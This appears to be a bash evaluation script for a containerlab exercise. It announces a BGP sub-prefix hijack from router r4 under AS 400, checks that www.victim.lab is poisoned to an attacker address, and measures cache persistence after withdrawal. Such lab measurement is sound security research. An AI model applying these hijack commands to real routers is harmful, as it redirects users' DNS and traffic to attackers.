#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="evaluation_dns_${TIMESTAMP}.log"
CSV="evaluation_dns_${TIMESTAMP}.csv"

echo "=== BGP DNS Hijack Chain Evaluation ===" | tee "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo ""

echo "phase,test,result,expected,pass" > "$CSV"

# Phase 1: Baseline
echo "--- Phase 1: Baseline ---" | tee -a "$LOG"

BASELINE_DNS=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Baseline DNS query: $BASELINE_DNS" | tee -a "$LOG"
if [ "$BASELINE_DNS" = "13.0.0.100" ]; then
  echo "baseline,direct_dns,$BASELINE_DNS,13.0.0.100,PASS" >> "$CSV"
else
  echo "baseline,direct_dns,$BASELINE_DNS,13.0.0.100,FAIL" >> "$CSV"
fi

# Capture full route output, then extract a best-effort AS path.
BGP_BASELINE_RAW=$(docker exec clab-bgp-dns-hijack-r6 vtysh -c "show bgp ipv4 unicast 13.0.0.0/24" 2>&1)

# FRR often prints path numbers on a dedicated line like: "500 200 300".
BASELINE_PATH=$(echo "$BGP_BASELINE_RAW" | awk '
  /^[[:space:]]+[0-9]+([[:space:]][0-9]+)+[[:space:]]*$/ {
    gsub(/^[[:space:]]+|[[:space:]]+$/, "");
    print;
    exit
  }
')

# Fallback for formats that contain literal text like "AS path".
if [ -z "$BASELINE_PATH" ]; then
  BASELINE_PATH=$(echo "$BGP_BASELINE_RAW" | grep -m1 "AS path" | sed 's/^[[:space:]]*//')
fi

if echo "$BASELINE_PATH" | grep -Eq '(^| )300( |$)'; then
  BASELINE_PATH_PASS="PASS"
else
  BASELINE_PATH_PASS="FAIL"
fi

echo "Baseline BGP path from R6: $BASELINE_PATH" | tee -a "$LOG"
echo "baseline,bgp_path_r6,\"$BASELINE_PATH\",contains_300,$BASELINE_PATH_PASS" >> "$CSV"

# Phase 2: Attack
echo "" | tee -a "$LOG"
echo "--- Phase 2: Sub-prefix Hijack ---" | tee -a "$LOG"
ATTACK_START=$(date +%s)

docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "ip route 13.0.0.0/25 10.40.0.2" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "network 13.0.0.0/25" \
  -c "end" 2>/dev/null

echo "Hijack announced, waiting 10s..." | tee -a "$LOG"
sleep 10
ATTACK_CONVERGE=$(date +%s)
CONVERGE_TIME=$((ATTACK_CONVERGE - ATTACK_START))
echo "Convergence time: ${CONVERGE_TIME}s" | tee -a "$LOG"
echo "attack,convergence_time,${CONVERGE_TIME}s,<15s,INFO" >> "$CSV"

# Flush and test
docker exec clab-bgp-dns-hijack-client pkill unbound 2>/dev/null
sleep 1
docker exec clab-bgp-dns-hijack-client unbound -c /etc/unbound/unbound.conf 2>/dev/null
sleep 1

# Phase 3: Verify poisoning
echo "" | tee -a "$LOG"
echo "--- Phase 3: DNS Poisoning Check ---" | tee -a "$LOG"

POISON_DNS=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "DNS during hijack (direct): $POISON_DNS" | tee -a "$LOG"
if [ "$POISON_DNS" = "14.0.0.66" ]; then
  echo "attack,dns_poisoned,$POISON_DNS,14.0.0.66,PASS" >> "$CSV"
  echo "  -> DNS POISONED SUCCESSFULLY" | tee -a "$LOG"
else
  echo "attack,dns_poisoned,$POISON_DNS,14.0.0.66,FAIL" >> "$CSV"
fi

# Populate cache through resolver
CACHED_POISON=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "DNS during hijack (cached): $CACHED_POISON" | tee -a "$LOG"
echo "attack,cached_poison,$CACHED_POISON,14.0.0.66,INFO" >> "$CSV"

# Check traceroute during hijack
TRACEROUTE_HIJACK=$(docker exec clab-bgp-dns-hijack-client traceroute -n -w 2 -q 1 13.0.0.50 2>/dev/null | tail -1)
echo "Traceroute during hijack: $TRACEROUTE_HIJACK" | tee -a "$LOG"

# Phase 4: Withdraw
echo "" | tee -a "$LOG"
echo "--- Phase 4: Withdraw Hijack ---" | tee -a "$LOG"

docker exec clab-bgp-dns-hijack-r4 vtysh -c "configure terminal" \
  -c "router bgp 400" \
  -c "address-family ipv4 unicast" \
  -c "no network 13.0.0.0/25" \
  -c "end" \
  -c "configure terminal" \
  -c "no ip route 13.0.0.0/25 10.40.0.2" \
  -c "end" 2>/dev/null

echo "Hijack withdrawn, waiting 10s..." | tee -a "$LOG"
sleep 10

# Phase 5: Cache persistence
echo "" | tee -a "$LOG"
echo "--- Phase 5: Post-Attack Cache Persistence ---" | tee -a "$LOG"

POST_DIRECT=$(docker exec clab-bgp-dns-hijack-client dig @13.0.0.50 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Post-attack DNS (direct): $POST_DIRECT" | tee -a "$LOG"
if [ "$POST_DIRECT" = "13.0.0.100" ]; then
  echo "post_attack,direct_dns_restored,$POST_DIRECT,13.0.0.100,PASS" >> "$CSV"
else
  echo "post_attack,direct_dns_restored,$POST_DIRECT,13.0.0.100,FAIL" >> "$CSV"
fi

POST_CACHED=$(docker exec clab-bgp-dns-hijack-client dig @127.0.0.1 www.victim.lab +short +timeout=5 2>/dev/null)
echo "Post-attack DNS (cached): $POST_CACHED" | tee -a "$LOG"
if [ "$POST_CACHED" = "14.0.0.66" ]; then
  echo "post_attack,cache_still_poisoned,$POST_CACHED,14.0.0.66,PASS" >> "$CSV"
  echo "  -> CACHE STILL POISONED after hijack withdrawal!" | tee -a "$LOG"
else
  echo "post_attack,cache_still_poisoned,$POST_CACHED,14.0.0.66,FAIL" >> "$CSV"
fi

echo "" | tee -a "$LOG"
echo "=== Summary ===" | tee -a "$LOG"
echo "Baseline DNS: $BASELINE_DNS (expected: 13.0.0.100)" | tee -a "$LOG"
echo "Baseline BGP path check: $BASELINE_PATH_PASS (expected to include AS300)" | tee -a "$LOG"
echo "During hijack: $POISON_DNS (expected: 14.0.0.66 = attacker)" | tee -a "$LOG"
echo "Post-attack direct: $POST_DIRECT (expected: 13.0.0.100 = restored)" | tee -a "$LOG"
echo "Post-attack cached: $POST_CACHED (expected: 14.0.0.66 = still poisoned)" | tee -a "$LOG"
echo "" | tee -a "$LOG"
echo "Attack duration: ~${CONVERGE_TIME}s + hijack window" | tee -a "$LOG"
echo "Poison persistence: up to 180s per attacker TTL" | tee -a "$LOG"
echo "" | tee -a "$LOG"
echo "Results saved to: $CSV" | tee -a "$LOG"
echo "Full log saved to: $LOG" | tee -a "$LOG"
echo "Completed: $(date)" | tee -a "$LOG"